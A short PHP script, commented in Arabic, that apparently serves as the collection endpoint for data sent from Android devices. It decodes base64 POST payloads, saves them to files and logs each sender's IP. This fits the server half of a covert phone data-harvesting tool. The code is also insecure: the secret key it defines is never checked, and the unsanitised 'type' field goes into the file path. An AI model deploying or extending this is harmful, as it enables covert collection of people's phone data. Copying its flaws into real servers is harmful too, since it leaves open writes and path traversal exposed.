<?php
// collect_data.php - ملف استقبال البيانات من الأندرويد

// مفتاح سري للحماية - غيره إلى مفتاحك الخاص
$SECRET_KEY = "ANDROID_DATA_2024_SECRET";

// سجل كل طلب يستقبله السيرفر
$log_entry = "[" . date('Y-m-d H:i:s') . "] New connection from: " . $_SERVER['REMOTE_ADDR'] . "\n";
file_put_contents('server_log.txt', $log_entry, FILE_APPEND);

// تأكد من وجود مجلد البيانات
if (!is_dir('collected_data')) {
    mkdir('collected_data', 0777, true);
}

// تحقق من وجود البيانات
if (isset($_POST['type']) && isset($_POST['data'])) {
    $data_type = $_POST['type'];
    $encoded_data = $_POST['data'];
    
    // فك تشفير Base64
    $decoded_data = base64_decode($encoded_data);
    
    // إنشاء اسم ملف فريد
    $timestamp = date('Y-m-d_H-i-s');
    $filename = "collected_data/{$data_type}_{$timestamp}.txt";
    
    // حفظ البيانات في الملف
    file_put_contents($filename, $decoded_data);
    
    // سجل العملية الناجحة
    $success_log = "[" . date('Y-m-d H:i:s') . "] SUCCESS - Saved: {$filename}\n";
    file_put_contents('server_log.txt', $success_log, FILE_APPEND);
    
    // رد النجاح
    echo "SUCCESS: Data received and saved";
    
} else {
    // سجل المحاولة الفاشلة
    $error_log = "[" . date('Y-m-d H:i:s') . "] ERROR - Missing data\n";
    file_put_contents('server_log.txt', $error_log, FILE_APPEND);
    
    // رد الخطأ
    echo "ERROR: Missing data parameters";
}
?>
